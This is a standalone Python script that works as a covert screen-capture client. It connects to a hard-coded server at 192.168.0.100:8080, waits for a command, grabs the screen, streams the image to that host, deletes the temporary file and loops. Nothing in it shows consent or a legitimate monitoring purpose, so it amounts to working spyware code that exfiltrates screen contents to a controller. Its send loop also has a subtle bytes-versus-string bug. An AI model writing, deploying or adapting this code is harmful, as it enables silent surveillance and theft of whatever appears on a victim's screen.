#!/usr/bin/env python3
import socket 
import os 
import sys
import time
import pyscreenshot
import tempfile

sock = socket.socket()
host = '192.168.0.100'
port = 8080
filepath = tempfile.gettempdir() + "/temp_screen.png"

def connect():
    try:
        sock.connect((host,port))
        print("Connected to server " + host)
    except:
        print("Failed connecting to server!...")
        sys.exit()

def take_screenshot():
    cmd = sock.recv(1024)
    cmd = cmd.decode()

    if cmd == "1":
        #take screenshot

        img = pyscreenshot.grab()
        img.save(filepath)

        send_screenshot()
    else:
        print("Exiting...")
        sock.close()
        sys.exit()

def send_screenshot():
    filesize = os.path.getsize(filepath)
    sock.send(str(filesize).encode('utf-8'))
    
    with open(filepath ,'rb') as f:
        bytesToSend = f.read(1024)
        sock.send(bytesToSend)
        while bytesToSend != "":
            bytesToSend = f.read(1024)
            sock.send(bytesToSend)
            status = sock.recv(1024)
            if status == "Download Finished!".encode('utf-8'):
                break
        
    #print("File was sent succesfully!...")
    os.remove(filepath) #delete temporary file
    take_screenshot()

if __name__ == '__main__':
    connect()
    take_screenshot()
